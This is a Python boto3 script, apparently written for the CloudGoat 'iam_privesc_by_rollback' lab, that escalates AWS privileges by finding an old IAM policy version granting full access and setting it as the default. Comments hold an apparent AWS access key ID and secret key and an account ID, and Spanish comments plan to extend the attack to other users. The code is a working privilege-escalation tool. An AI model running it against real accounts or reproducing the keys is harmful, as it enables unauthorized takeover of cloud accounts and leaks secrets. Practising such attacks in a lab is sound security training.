from turtle import settiltangle
import botocore
import boto3
from numpy import empty

sess = boto3.session.Session(profile_name='raynor')

client = sess.client('iam')
bucks = sess.client('s3')

#AWS Access Key ID raynor AKIASQTZUHT6BZ2UF3X6
#AWS Secret Access Key raynor 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
# raynor-iam_privesc_by_rollback_cgidkwkjnqogv5
# {
#     "AttachedPolicies": [
#         {
#             "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgidnyoyi312oc",
#             "PolicyArn": "arn:aws:iam::173127515388:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidnyoyi312oc"
#         }
#     ]
# }


def checkOpen(arn, id):
    getVersion = client.get_policy_version(
            PolicyArn=arn,
            VersionId=id
            )

    Statement = getVersion['PolicyVersion']['Document']['Statement']

    if type(Statement) is not list:
        effect = True if Statement['Effect'] == 'Allow' else False
        action = True if Statement['Action'] == '*' else False
        resource = True if Statement['Resource'] == '*' else False
        
        if effect and action and resource:
            return True
    else:
        for stmnt in Statement:
            effect = True if stmnt['Effect'] == 'Allow' else False
            action = True if stmnt['Action'] == '*' else False
            resource = True if stmnt['Resource'] == '*' else False
            if effect and action and resource:
                return True
    return False

def change_pol(user, userPolicies):

    current = 'v0'

    print("Getting all versions")

    for policy in userPolicies:
        name = policy['PolicyName']
        arn = policy['PolicyArn']
        

        versions = client.list_policy_versions(
            PolicyArn=arn
            )
        
        ids = [(x['VersionId'],x['IsDefaultVersion']) for x in versions['Versions'] ]

        for id, version in ids:
            if version:
                print(f"{id} is current version")
                current = id

        for id, version in ids:
            
            isOpen = checkOpen(arn, id)

            if isOpen:
                print(f"Version {id} has full access")
                print("Trying policy rollback")
                try:
                    setting = client.set_default_policy_version(
                        PolicyArn=arn,
                        VersionId=id
                    )
                    print("!! Rollback successfull !!")
                    print()
                except botocore.exceptions.ClientError as error:
                    print(error)
                    print('Couldnt change policy')

                getCurrent = client.get_policy_version(
                    PolicyArn=arn,
                    VersionId=id
                )
                
                if getCurrent['PolicyVersion']['IsDefaultVersion']:
                    print(f"{getCurrent['PolicyVersion']['VersionId']}  is current version")
                
def execution(usuario):

    IAM_Users = client.list_users()['Users']

    #for user in IAM_Users:
    #   print(user['UserName'])
    #  usuario = user['UserName']

    
    #usuario = 'raynor-iam_privesc_by_rollback_cgidr03h5mz848'
    print('Listing Attached User Policies')
    response = client.list_attached_user_policies(UserName=usuario)
    userPolicies = response['AttachedPolicies']

# mirar otros usuarios y si yo mismo lo tengo yo me hago el roll back y si otro usuario tiene el permiso intentar
# hacer el otro ataque

# detect misconfig en mi perfil
    if userPolicies:
        try:

            change_pol(usuario, userPolicies)

            
        except botocore.exceptions.ClientError as error:

            print(f"Couldn't change user's policy. Error: {error}")
            
#execution('raynor-iam_privesc_by_rollback_cgidr03h5mz848')